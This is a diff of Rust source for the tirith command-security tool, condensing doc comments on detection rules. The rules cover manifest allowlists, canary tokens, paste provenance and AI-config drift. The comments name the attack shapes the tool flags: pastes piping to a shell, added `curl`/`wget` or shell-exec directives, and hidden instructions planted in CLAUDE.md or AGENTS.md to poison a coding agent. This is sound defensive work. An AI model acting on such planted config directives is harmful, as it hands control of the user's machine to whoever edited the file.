-    /// differs from the command the card attests to (tampering after the card
-    /// was published). High severity.
+    /// M11 ch1 — a trusted card was found but the command being run differs from
+    /// what it attests (tampering after publish). High.
     CommandCardMismatch,
 
-    // Repo command-manifest rules (M11 ch2). A repo command manifest
+    // Repo command-manifest rules (M11 ch2). A repo manifest
     // (`.tirith/commands.yaml`, `crate::commands_manifest`) is a
-    // SUPPRESSION-BOUNDED allowlist. These fire from `engine::analyze` (Exec
-    // context) after the engine's own findings are assembled: the manifest is
-    // discovered relative to `ctx.cwd` (walk up to the `.git` boundary, or
-    // `TIRITH_POLICY_ROOT/.tirith/commands.yaml`). They carry no PATTERN_TABLE
-    // entry (the trigger is repo STATE — a manifest file on disk — not a regex
-    // on the input) and live in `EXTERNALLY_TRIGGERED_RULES`, covered by unit
-    // tests in `commands_manifest.rs` plus an engine integration regression
-    // test (the load-bearing "manifest cannot weaken a High finding" case).
-    /// M11 ch2 — an `analyze()`-cleared command does NOT appear under
-    /// `allowed[*]` in the repo's `.tirith/commands.yaml`. Info severity — a
-    /// pure annotation that never changes the action. This is the SOLE rule a
-    /// matching `allowed[*]` entry suppresses; an exact allowed match emits
-    /// nothing (and crucially does NOT suppress any other finding). When no
-    /// manifest exists, this rule never fires.
+    // SUPPRESSION-BOUNDED allowlist. Fire from `engine::analyze` after the
+    // engine's findings are assembled; the manifest is discovered relative to
+    // `ctx.cwd` (walk to `.git`, or `TIRITH_POLICY_ROOT/.tirith/commands.yaml`).
+    // No PATTERN_TABLE entry; `EXTERNALLY_TRIGGERED_RULES`. Unit-tested in
+    // `commands_manifest.rs` plus the load-bearing "manifest cannot weaken a High
+    // finding" engine regression test.
+    /// M11 ch2 — an `analyze()`-cleared command absent from `allowed[*]`. Info —
+    /// a pure annotation. The SOLE rule a matching `allowed[*]` suppresses (and it
+    /// suppresses nothing else). Never fires when no manifest exists.
     RepoCommandUnknown,
-    /// M11 ch2 — the command matched a `dangerous[*]` glob pattern (`*`-only in
-    /// v1) declared in the repo's `.tirith/commands.yaml`. High severity
-    /// (which maps to the Block action) for `action: block`, Medium (→ Warn
-    /// action) for `action: warn` — there is no `Severity::Block`. ELEVATION
-    /// ONLY: a dangerous match adds this finding regardless of what `analyze()`
-    /// returned (stricter is always safe). The manifest can elevate via this
-    /// rule but can NEVER weaken an engine finding of severity
-    /// ≥ High.
+    /// M11 ch2 — the command matched a `dangerous[*]` glob (`*`-only in v1). High
+    /// (→ Block) for `action: block`, Medium (→ Warn) for `action: warn`.
+    /// ELEVATION ONLY: added regardless of what `analyze()` returned; the manifest
+    /// can NEVER weaken an engine finding ≥ High.
     RepoCommandDangerousPattern,
 
-    // Honeytoken / canary rule (M11 ch3, design-decision D3). A canary is a
-    // deliberately-synthetic, clearly-fake secret-shaped token the user planted
-    // as bait (`tirith canary create`), recorded in a local-first store at
-    // `state_dir()/canaries.jsonl` (`crate::canary`). This fires from
-    // `engine::analyze` (paste + exec) AND `engine::analyze_output` when a
-    // REGISTERED canary token appears in the scanned text — detection is a STORE
-    // lookup, not a shape match, so an unrelated real credential fires the
-    // existing `CredentialInText` / `HighEntropySecret` rules, NEVER this one.
-    // It carries no PATTERN_TABLE entry (the trigger is runtime store STATE plus
-    // a substring match, not a regex on arbitrary input) and lives in
-    // `EXTERNALLY_TRIGGERED_RULES`, covered by unit tests in
-    // `crates/tirith-core/src/canary.rs` against a `tempfile::tempdir()` store
-    // plus engine hot-path tests that point the lookup at a temp store.
-    /// M11 ch3 — a synthetic canary token the user registered with
-    /// `tirith canary create` was found in the scanned input (a command, paste,
-    /// or inspected tool output). High severity: a canary is bait planted where
-    /// it should never be read, so a match is a strong "someone touched the
-    /// decoy" signal. ONLY the user's own registered tokens fire this — the
-    /// store scopes detection, so a genuine third-party credential does not.
+    // Honeytoken / canary rule (M11 ch3, D3). A canary is a synthetic fake
+    // secret the user planted as bait (`tirith canary create`), recorded at
+    // `state_dir()/canaries.jsonl` (`crate::canary`). Fires from `engine::analyze`
+    // (paste + exec) AND `analyze_output` when a REGISTERED token appears —
+    // detection is a STORE lookup, not a shape match, so a real credential fires
+    // `CredentialInText` / `HighEntropySecret`, never this. No PATTERN_TABLE entry;
+    // `EXTERNALLY_TRIGGERED_RULES`. Unit-tested in `canary.rs`.
+    /// M11 ch3 — a registered canary token was found in the scanned input. High —
+    /// bait planted where it should never be read. ONLY the user's own tokens fire
+    /// this (the store scopes detection).
     CanaryTokenTouched,
 
-    // Paste-provenance rule (M12 ch1). A companion browser extension (separate
-    // repo) writes a JSON record at `state_dir()/clipboard_source.json` whenever
-    // it sets the system clipboard (`{updated_at, content_sha256, source_url,
-    // source_title, hidden_text_detected}`). This fires from `engine::analyze`
-    // in `ScanContext::Paste` ONLY: when `sha256(pasted_input)` matches the
-    // record's `content_sha256` (so the paste genuinely came from the recorded
-    // source) AND a URL host in the pasted command differs from the recorded
-    // `source_url` host. Because the trigger is runtime companion-file state plus
-    // a content-hash match — not a regex / byte signal on the input — it carries
-    // no PATTERN_TABLE entry and lives in `EXTERNALLY_TRIGGERED_RULES`, covered by
-    // unit tests in `crates/tirith-core/src/rules/paste_provenance.rs` against a
-    // `tempfile::tempdir()` record plus a CLI integration test. See
-    // `crate::clipboard::ClipboardSourceRecord` and `docs/paste-provenance.md`.
-    /// M12 ch1 — the pasted content matched a recorded clipboard source, but a
-    /// destination host in the paste differs from the source page's host.
+    // Paste-provenance rule (M12 ch1). A companion browser extension writes a JSON
+    // record at `state_dir()/clipboard_source.json` on every clipboard set. Fires
+    // from `engine::analyze` in `ScanContext::Paste` ONLY when
+    // `sha256(pasted_input)` matches the record AND a destination host in the
+    // paste differs from the recorded `source_url` host. No PATTERN_TABLE entry;
+    // `EXTERNALLY_TRIGGERED_RULES`. Unit-tested in `rules/paste_provenance.rs`.
+    // See `crate::clipboard::ClipboardSourceRecord` and `docs/paste-provenance.md`.
+    /// M12 ch1 — pasted content matched a recorded clipboard source but a
+    /// destination host differs from the source page's host.
     ///
-    /// **Info** when the host mismatch stands alone (docs pages on
-    /// `docs.example.com` legitimately link install URLs on `github.com` /
-    /// `npmjs.com` / `docker.io`, so a bare host mismatch is common and benign).
-    /// **High** when the mismatch is corroborated by at least one risk signal:
-    /// the source record flagged hidden text, a `ClipboardHidden` finding is
-    /// already present, the destination is a URL shortener, the paste pipes to a
-    /// shell interpreter (`PipeToInterpreter` already present), the destination
-    /// host is NOT in `policy.allowed_install_domains`, or an OSC 8 hyperlink in
-    /// the paste renders a visible URL whose host differs from its actual target.
+    /// **Info** when the host mismatch stands alone (docs pages legitimately link
+    /// install URLs on other hosts). **High** when corroborated by a risk signal:
+    /// source flagged hidden text, a `ClipboardHidden` finding present, a URL
+    /// shortener, `PipeToInterpreter` present, the host is outside
+    /// `policy.allowed_install_domains`, or an OSC 8 visible/target host mismatch.
     PasteSourceMismatch,
 
-    // AI-config drift rules (M13 ch5). An AI-config file (`CLAUDE.md`,
-    // `AGENTS.md`, `.cursorrules`, `.cursor/rules/*`, `.claude/*`, …) is the
-    // instruction surface a coding agent reads and acts on. These fire ONLY
-    // from `tirith ai diff` (`crate::rules::aifile::diff_findings`), which
-    // compares each current AI-config file to the last-known-safe snapshot at
-    // `state_dir()/ai_config_snapshot.json`. They are DIFF-triggered, never
-    // produced by the engine's `analyze` pipeline or the `tirith scan` FileScan
-    // path, so — exactly like [`PasteSourceMismatch`], `canary_token_touched`,
-    // and the M11 command-card/manifest rules — they carry no PATTERN_TABLE
-    // entry and live in `EXTERNALLY_TRIGGERED_RULES`. Detection reuses the
-    // existing `agent_instruction_hidden` hidden-content / invisible-text logic
-    // in `aifile.rs`; the diff layer NORMALIZES both sides (trims trailing
-    // whitespace, collapses blank-line runs) so a Markdown reformat alone is not
-    // a finding. Covered by unit tests in `aifile.rs` plus a CLI integration
-    // test that plants a snapshot + a changed file.
-    /// M13 ch5 — `tirith ai diff` found a NEW instruction line added to an
-    /// AI-config file since the last-known-safe snapshot: either an added line
-    /// that carries hidden / invisible-text content (the
-    /// `agent_instruction_hidden` shape — an HTML comment or visually-hidden
-    /// element carrying a directive), or a newly-added imperative directive
-    /// line. High severity — a fresh hidden instruction in the file an agent
-    /// trusts is the prompt-injection / config-poisoning shape this diff exists
-    /// to surface. Only lines PRESENT IN THE NEW FILE BUT NOT THE SNAPSHOT fire;
-    /// a line removed since the snapshot never fires this rule.
+    // AI-config drift rules (M13 ch5). Fire ONLY from `tirith ai diff`
+    // (`aifile::diff_findings`), comparing each AI-config file to the
+    // last-known-safe snapshot at `state_dir()/ai_config_snapshot.json`.
+    // Diff-triggered, never from the `analyze` pipeline or FileScan, so — like
+    // `PasteSourceMismatch` and the M11 card/manifest rules — no PATTERN_TABLE
+    // entry, `EXTERNALLY_TRIGGERED_RULES`. Detection reuses the
+    // `agent_instruction_hidden` logic; the diff layer normalizes both sides so a
+    // reformat alone is not a finding. Unit-tested in `aifile.rs` plus a CLI test.
+    /// M13 ch5 — `tirith ai diff` found a NEW instruction line added since the
+    /// snapshot: hidden/invisible content (the `agent_instruction_hidden` shape)
+    /// or a newly-added imperative directive. High — config-poisoning. Only lines
+    /// in NEW but not the snapshot fire; a removal never fires.
     AiConfigHiddenInstructionAdded,
-    /// M13 ch5 — `tirith ai diff` found a NEW or ESCALATED tool-use directive
-    /// added to an AI-config file since the last-known-safe snapshot: a newly-
-    /// added instruction to run / exec / spawn a shell, make a network call, or
-    /// write files (e.g. a new `run:` / `exec`/`shell` directive, a `curl`/`wget`
-    /// network instruction, or a file-write directive that was not in the
-    /// snapshot). High severity — silently widening what the agent is told it may
-    /// do is an escalation of the config's blast radius. Like
-    /// `AiConfigHiddenInstructionAdded`, only ADDED lines fire.
+    /// M13 ch5 — `tirith ai diff` found a NEW tool-use directive added since the
+    /// snapshot (run/exec/spawn a shell, network call, or file write). High —
+    /// silently widening the agent's blast radius. Only ADDED lines fire.
     AiConfigToolUseEscalation,
 }
 
@@ -1003,15 +702,9 @@ impl fmt::Display for RuleId {
     }
 }
 
-/// Severity level for findings.
-///
-/// Serializes UPPERCASE (`CRITICAL`, …). On INPUT, deserialization accepts the
-/// UPPERCASE form OR the exact lowercase form (e.g. `CRITICAL` or `critical`),
-/// the latter via a per-variant alias — so a hand-written policy and the M13
-/// ch4 custom-rule DSL examples (which use `severity: critical`) both load.
-/// Mixed/title case such as `Critical` is NOT accepted (no such alias). Output
-/// always stays UPPERCASE, so an UPPERCASE/lowercase round-trip normalizes case
-/// but never breaks.
+/// Severity level for findings. Serializes UPPERCASE; deserialization accepts
+/// UPPERCASE or exact lowercase (per-variant alias) but NOT title case, so both
+/// hand-written policy and the M13 ch4 DSL examples (`severity: critical`) load.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
 #[serde(rename_all = "UPPERCASE")]
 pub enum Severity {
@@ -1155,15 +848,11 @@ impl Action {
 
 impl std::str::FromStr for Action {
     type Err = String;
-    /// Parse the strict lowercase tokens used by lab-corpus / fixture TOML.
-    /// Closed enum set: `allow`, `warn`, `block`, `warn_ack` — case-sensitive
-    /// on purpose, so a corpus typo like `"BLOCK"` or `"blocK"` (which used
-    /// to slip past the inline match-on-string and silently always-FAIL the
-    /// scenario) surfaces as a hard parse error instead. Centralised here so
-    /// callers (`lab.rs::run`, future consumers) share one parse table — the
-    /// existing `#[serde(rename_all = "snake_case")]` derive only handles
-    /// deserialization through serde; this is the explicit `&str` path used
-    /// by the corpus' `expected_action` field.
+    /// Parse the strict lowercase tokens used by lab-corpus / fixture TOML
+    /// (`allow`/`warn`/`block`/`warn_ack`). Case-sensitive on purpose, so a typo
+    /// like `"blocK"` is a hard parse error instead of a silent always-FAIL.
+    /// Centralised so callers share one table (the serde derive only covers
+    /// deserialization; this is the explicit `&str` path).
     fn from_str(s: &str) -> Result<Self, Self::Err> {
         match s {
             "allow" => Ok(Action::Allow),
@@ -1238,37 +927,20 @@ pub struct Verdict {
     #[serde(skip_serializing_if = "Option::is_none")]
     pub escalation_reason: Option<String>,
 
-    /// Best-effort origin of the caller — *who* invoked tirith. M4 item 8
-    /// records this on the verdict and the audit entry; the policy schema
-    /// `agent_rules` is consulted against it by
-    /// [`crate::escalation::apply_agent_rules`] inside
-    /// [`crate::escalation::post_process_verdict`], where a `deny` match
-    /// forces [`Action::Block`] and appends a
-    /// [`RuleId::AgentDeniedByPolicy`] finding. See
-    /// [`crate::agent_origin`] for the trust model (caller-claimed,
-    /// operator-trust, never adversary-resistant).
-    ///
-    /// `None` means the caller path that produced this verdict has not been
-    /// wired (engine-internal fast-exits, the gateway's short-circuit path
-    /// before classification, etc.) or did not have enough signal to
-    /// classify. `apply_agent_rules` treats `None` as
-    /// [`crate::policy::AgentDecision::Unspecified`] — no enforcement
-    /// effect, an engine path that never set an origin has nothing to match
-    /// against. Old JSON without this field still parses (serde-default).
+    /// Best-effort origin of the caller (M4 item 8). `agent_rules` is consulted
+    /// against it by [`crate::escalation::apply_agent_rules`], where a `deny`
+    /// forces [`Action::Block`] + a [`RuleId::AgentDeniedByPolicy`] finding. See
+    /// [`crate::agent_origin`] for the trust model (caller-claimed, operator-trust,
+    /// never adversary-resistant). `None` (unwired path / insufficient signal) is
+    /// treated as `Unspecified` — no enforcement. Old JSON parses (serde-default).
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub agent_origin: Option<crate::agent_origin::AgentOrigin>,
 
-    /// M11 ch2 — the `allowed[*].name` from the repo command manifest
-    /// (`.tirith/commands.yaml`) that exactly matched this command, if any.
-    ///
-    /// AUDIT-CONTEXT ONLY. This records *why* an otherwise-clean command was
-    /// not annotated with `RepoCommandUnknown` (it was catalogued), so an
-    /// operator reading the audit log / JSON can see the manifest match. It is
-    /// NEVER read by [`action_from_findings`] / `recalculate_action` — those
-    /// take `&[Finding]`, not `&Verdict`. A repo cannot weaken a verdict by
-    /// populating this field; the most a matching `allowed[*]` entry does is
-    /// suppress the single Info `RepoCommandUnknown` finding. Old JSON without
-    /// this field still parses (serde-default).
+    /// M11 ch2 — the `allowed[*].name` from the repo manifest that matched, if
+    /// any. AUDIT-CONTEXT ONLY: records why a clean command was not annotated
+    /// `RepoCommandUnknown`. NEVER read by `action_from_findings` (which takes
+    /// `&[Finding]`), so a repo cannot weaken a verdict via this field. Old JSON
+    /// parses (serde-default).
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub manifest_allowed_match: Option<String>,
 }
